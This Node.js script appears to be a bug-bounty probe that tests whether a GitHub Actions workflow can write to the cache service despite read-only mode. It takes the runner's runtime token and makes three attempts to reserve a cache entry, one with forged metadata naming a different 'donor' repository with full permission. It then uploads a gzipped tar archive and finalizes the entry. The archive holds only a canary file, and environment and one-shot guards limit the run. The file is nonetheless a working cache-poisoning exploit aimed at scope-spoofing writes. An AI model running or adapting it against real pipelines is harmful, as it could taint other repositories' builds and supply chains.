'use strict'

const crypto = require('crypto')
const zlib = require('zlib')

const PUBLIC_CACHE_KEY = 'bbp-pages-public-cache-write-bypass-20260918-r10-p4w7'
const DONOR_CACHE_KEY = 'bbp-pages-private-cache-write-spoof-20260918-r10-p4w7'
const CACHE_VERSION = '9a41698a1c579c99c768ac86a2d875f88e262dafa9f57c8c1514bb2eb813a769'
const PUBLIC_REPOSITORY_ID = '1375300224'
const DONOR_REPOSITORY_ID = '1375281864'
const TARGET_REF = 'refs/heads/main'
const CACHE_PERMISSION_ALL = '3'
const ARCHIVE_MARKER_PATH = 'cache-fixture/write-canary.txt'
const ARCHIVE_MARKER = Buffer.from('BBP_CACHE_WRITE_CANARY_20260918_R10_P4W7\n', 'utf8')
const MAX_RESPONSE_BYTES = 1024 * 1024
const MAX_ARCHIVE_BYTES = 1024 * 1024
const SERVICE = 'github.actions.results.api.v1.CacheService'

function marker(name, level = 'notice') {
  process.stderr.write(`::${level}::${name}_20260918_R10_P4W7\n`)
}

function field(object, snakeName, camelName) {
  return object && (object[snakeName] ?? object[camelName])
}

function isProtoResponse(value) {
  return (
    value !== null &&
    typeof value === 'object' &&
    !Array.isArray(value) &&
    (!Object.prototype.hasOwnProperty.call(value, 'ok') || typeof value.ok === 'boolean')
  )
}

async function readBounded(response) {
  const declared = Number(response.headers.get('content-length') || 0)
  if (declared > MAX_RESPONSE_BYTES) throw new Error('response too large')
  if (!response.body) return Buffer.alloc(0)

  const chunks = []
  let total = 0
  for await (const chunk of response.body) {
    const buffer = Buffer.from(chunk)
    total += buffer.length
    if (total > MAX_RESPONSE_BYTES) throw new Error('response too large')
    chunks.push(buffer)
  }
  return Buffer.concat(chunks)
}

async function postJson(origin, method, token, body) {
  const controller = new AbortController()
  const timer = setTimeout(() => controller.abort(), 10000)
  try {
    const response = await fetch(new URL(`/twirp/${SERVICE}/${method}`, origin), {
      method: 'POST',
      headers: {
        accept: 'application/json',
        authorization: `Bearer ${token}`,
        'content-type': 'application/json'
      },
      body: JSON.stringify(body),
      redirect: 'error',
      signal: controller.signal
    })
    const raw = await readBounded(response)
    let parsed = null
    try {
      parsed = JSON.parse(raw.toString('utf8'))
    } catch (_) {
      parsed = null
    }
    return {status: response.status, body: parsed}
  } finally {
    clearTimeout(timer)
  }
}

function validateBlobUrl(value) {
  const url = new URL(value)
  if (
    url.protocol !== 'https:' ||
    !url.hostname.endsWith('.blob.core.windows.net') ||
    url.username !== '' ||
    url.password !== '' ||
    url.port !== ''
  ) {
    throw new Error('unexpected cache archive host')
  }
  return url
}

async function putArchive(url, archive) {
  const controller = new AbortController()
  const timer = setTimeout(() => controller.abort(), 10000)
  try {
    const response = await fetch(url, {
      method: 'PUT',
      headers: {
        'content-type': 'application/octet-stream',
        'x-ms-blob-type': 'BlockBlob',
        'x-ms-version': '2021-08-06'
      },
      body: archive,
      redirect: 'error',
      signal: controller.signal
    })
    return {status: response.status}
  } finally {
    clearTimeout(timer)
  }
}

function writeOctal(header, offset, length, value) {
  const encoded = `${value.toString(8).padStart(length - 1, '0')}\0`
  header.write(encoded, offset, length, 'ascii')
}

function buildArchive() {
  const header = Buffer.alloc(512)
  header.write(ARCHIVE_MARKER_PATH, 0, 'utf8')
  writeOctal(header, 100, 8, 0o644)
  writeOctal(header, 108, 8, 0)
  writeOctal(header, 116, 8, 0)
  writeOctal(header, 124, 12, ARCHIVE_MARKER.length)
  writeOctal(header, 136, 12, 0)
  header.fill(32, 148, 156)
  header[156] = 48
  header.write('ustar\0', 257, 'ascii')
  header.write('00', 263, 'ascii')
  const checksum = header.reduce((sum, byte) => sum + byte, 0)
  const checksumText = checksum.toString(8).padStart(6, '0')
  header.write(checksumText, 148, 6, 'ascii')
  header[154] = 0
  header[155] = 32

  const padding = Buffer.alloc(Math.ceil(ARCHIVE_MARKER.length / 512) * 512 - ARCHIVE_MARKER.length)
  const tar = Buffer.concat([header, ARCHIVE_MARKER, padding, Buffer.alloc(1024)])
  const archive = zlib.gzipSync(tar, {level: 9, mtime: 0})
  if (archive.length === 0 || archive.length > MAX_ARCHIVE_BYTES) {
    throw new Error('invalid archive size')
  }
  return archive
}

function readTarString(buffer, start, length) {
  const end = buffer.indexOf(0, start)
  const boundedEnd = end === -1 || end > start + length ? start + length : end
  return buffer.subarray(start, boundedEnd).toString('utf8')
}

function parseTarSize(header) {
  const raw = readTarString(header, 124, 12).trim()
  if (!/^[0-7]+$/.test(raw)) throw new Error('unsupported tar size')
  const size = Number.parseInt(raw, 8)
  if (!Number.isSafeInteger(size) || size < 0 || size > MAX_ARCHIVE_BYTES) {
    throw new Error('invalid tar size')
  }
  return size
}

function countArchiveMarkers(tarBuffer) {
  const expectedDigest = crypto.createHash('sha256').update(ARCHIVE_MARKER).digest('hex')
  let offset = 0
  let matches = 0
  while (offset + 512 <= tarBuffer.length) {
    const header = tarBuffer.subarray(offset, offset + 512)
    if (header.every(byte => byte === 0)) break
    const name = readTarString(header, 0, 100).replace(/^\.\//, '').replace(/^\//, '')
    const size = parseTarSize(header)
    const type = header[156]
    const dataStart = offset + 512
    const dataEnd = dataStart + size
    if (dataEnd > tarBuffer.length) throw new Error('truncated tar entry')
    if ((type === 0 || type === 48) && name === ARCHIVE_MARKER_PATH) {
      const data = tarBuffer.subarray(dataStart, dataEnd)
      const digest = crypto.createHash('sha256').update(data).digest('hex')
      if (data.length === ARCHIVE_MARKER.length && digest === expectedDigest) matches += 1
    }
    offset = dataStart + Math.ceil(size / 512) * 512
  }
  return matches
}

function fullMetadata(repositoryId) {
  return {
    repository_id: repositoryId,
    scope: [{scope: TARGET_REF, permission: CACHE_PERMISSION_ALL}]
  }
}

function createRequest(key, metadata) {
  const request = {key, version: CACHE_VERSION}
  if (metadata !== undefined) request.metadata = metadata
  return request
}

function classifyCreate(response) {
  if (response.status === 401 || response.status === 403) return 'denied'
  if (response.status === 400) return 'malformed'
  if (response.status !== 200 || !isProtoResponse(response.body)) return 'failed'
  if (response.body.ok !== true) return 'rejected'
  const signedUrl = field(response.body, 'signed_upload_url', 'signedUploadUrl')
  return typeof signedUrl === 'string' && signedUrl.length > 0 ? 'accepted' : 'failed'
}

function classifyFinalize(response) {
  if (response.status === 401 || response.status === 403) return 'denied'
  if (response.status === 400) return 'malformed'
  if (response.status !== 200 || !isProtoResponse(response.body)) return 'failed'
  if (response.body.ok !== true) return 'rejected'
  const entryId = field(response.body, 'entry_id', 'entryId')
  const normalizedEntryId =
    typeof entryId === 'number' && Number.isSafeInteger(entryId) && entryId > 0
      ? String(entryId)
      : entryId
  return typeof normalizedEntryId === 'string' && /^[1-9][0-9]*$/.test(normalizedEntryId)
    ? 'accepted'
    : 'failed'
}

async function completeAcceptedReservation(origin, runtimeToken, attempt, response, archive) {
  const signedUrl = field(response.body, 'signed_upload_url', 'signedUploadUrl')
  let uploadUrl
  try {
    uploadUrl = validateBlobUrl(signedUrl)
  } catch (_) {
    marker(`${attempt.prefix}_SIGNED_URL_REJECTED`)
    return
  }
  marker(`${attempt.prefix}_SIGNED_URL_ACCEPTED`, 'warning')

  const upload = await putArchive(uploadUrl, archive)
  if (upload.status !== 200 && upload.status !== 201) {
    marker(`${attempt.prefix}_ARCHIVE_UPLOAD_REJECTED`)
    return
  }
  marker(`${attempt.prefix}_ARCHIVE_UPLOAD_ACCEPTED`, 'warning')

  const finalizeRequest = {
    key: attempt.key,
    size_bytes: String(archive.length),
    version: CACHE_VERSION
  }
  if (attempt.metadata !== undefined) finalizeRequest.metadata = attempt.metadata
  const finalized = await postJson(
    origin,
    'FinalizeCacheEntryUpload',
    runtimeToken,
    finalizeRequest
  )
  const outcome = classifyFinalize(finalized)
  if (outcome === 'accepted') {
    marker(`${attempt.prefix}_FINALIZE_ACCEPTED`, 'warning')
  } else if (outcome === 'denied' || outcome === 'rejected') {
    marker(`${attempt.prefix}_FINALIZE_REJECTED`)
  } else if (outcome === 'malformed') {
    marker(`${attempt.prefix}_FINALIZE_MALFORMED`)
  } else {
    marker(`${attempt.prefix}_FINALIZE_FAILED`)
  }
}

async function liveProbe() {
  if (process.env.PAGES_BBP_LIVE_CACHE_PROBE !== '1') {
    throw new Error('live guard missing')
  }
  if (
    process.env.GITHUB_RUN_NUMBER !== process.env.PAGES_BBP_EXPECTED_RUN ||
    process.env.GITHUB_RUN_ATTEMPT !== '1'
  ) {
    marker('PAGES_CACHE_WRITE_ONE_SHOT_GUARD_MISS')
    return
  }
  if (process.env.ACTIONS_CACHE_MODE !== 'read') {
    marker('PAGES_CACHE_WRITE_READ_MODE_GUARD_MISS')
    return
  }

  let runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN || ''
  delete process.env.ACTIONS_RUNTIME_TOKEN
  const resultsUrl = new URL(process.env.ACTIONS_RESULTS_URL || '')
  if (
    resultsUrl.protocol !== 'https:' ||
    !resultsUrl.hostname.endsWith('.actions.githubusercontent.com') ||
    resultsUrl.username !== '' ||
    resultsUrl.password !== '' ||
    resultsUrl.port !== ''
  ) {
    runtimeToken = ''
    throw new Error('unexpected cache service host')
  }

  const archive = buildArchive()
  marker('PAGES_CACHE_WRITE_ARCHIVE_READY')
  const attempts = [
    {
      prefix: 'PAGES_CACHE_WRITE_NO_METADATA',
      key: PUBLIC_CACHE_KEY,
      metadata: undefined
    },
    {
      prefix: 'PAGES_CACHE_WRITE_PUBLIC_METADATA',
      key: PUBLIC_CACHE_KEY,
      metadata: fullMetadata(PUBLIC_REPOSITORY_ID)
    },
    {
      prefix: 'PAGES_CACHE_WRITE_DONOR_METADATA',
      key: DONOR_CACHE_KEY,
      metadata: fullMetadata(DONOR_REPOSITORY_ID)
    }
  ]

  for (const attempt of attempts) {
    const created = await postJson(
      resultsUrl.origin,
      'CreateCacheEntry',
      runtimeToken,
      createRequest(attempt.key, attempt.metadata)
    )
    const outcome = classifyCreate(created)
    if (outcome === 'accepted') {
      marker(`${attempt.prefix}_RESERVATION_ACCEPTED`, 'warning')
      await completeAcceptedReservation(resultsUrl.origin, runtimeToken, attempt, created, archive)
      runtimeToken = ''
      return
    }
    if (outcome === 'failed' || outcome === 'malformed') {
      runtimeToken = ''
      marker(
        outcome === 'malformed'
          ? `${attempt.prefix}_RESERVATION_MALFORMED`
          : `${attempt.prefix}_RESERVATION_FAILED`
      )
      return
    }
    marker(`${attempt.prefix}_RESERVATION_REJECTED`)
  }

  runtimeToken = ''
  marker('PAGES_CACHE_WRITE_ALL_RESERVATIONS_REJECTED')
}

function selfTest() {
  const archive = buildArchive()
  const tar = zlib.gunzipSync(archive, {maxOutputLength: MAX_ARCHIVE_BYTES})
  if (countArchiveMarkers(tar) !== 1) throw new Error('archive self-test failed')

  const plain = createRequest(PUBLIC_CACHE_KEY)
  const scoped = createRequest(DONOR_CACHE_KEY, fullMetadata(DONOR_REPOSITORY_ID))
  if (
    Object.prototype.hasOwnProperty.call(plain, 'metadata') ||
    scoped.metadata.repository_id !== DONOR_REPOSITORY_ID ||
    scoped.metadata.scope.length !== 1 ||
    scoped.metadata.scope[0].permission !== CACHE_PERMISSION_ALL
  ) {
    throw new Error('request self-test failed')
  }

  if (
    classifyCreate({status: 403, body: {}}) !== 'denied' ||
    classifyCreate({status: 400, body: {}}) !== 'malformed' ||
    classifyCreate({status: 200, body: {}}) !== 'rejected' ||
    classifyCreate({status: 200, body: {ok: false}}) !== 'rejected' ||
    classifyCreate({status: 200, body: {ok: true}}) !== 'failed' ||
    classifyCreate({status: 200, body: {ok: true, signed_upload_url: 'https://unit.blob.core.windows.net/cache'}}) !== 'accepted' ||
    classifyFinalize({status: 200, body: {ok: true, entry_id: '1'}}) !== 'accepted' ||
    classifyFinalize({status: 200, body: {ok: true, entry_id: 1}}) !== 'accepted' ||
    classifyFinalize({status: 200, body: {ok: true, entry_id: '0'}}) !== 'failed'
  ) {
    throw new Error('response classifier self-test failed')
  }
  process.stdout.write('SELF_TEST_OK\n')
}

if (process.argv.includes('--self-test')) {
  selfTest()
} else {
  liveProbe().catch(() => {
    marker('PAGES_CACHE_WRITE_PROBE_ABORTED')
    process.exitCode = 1
  })
}
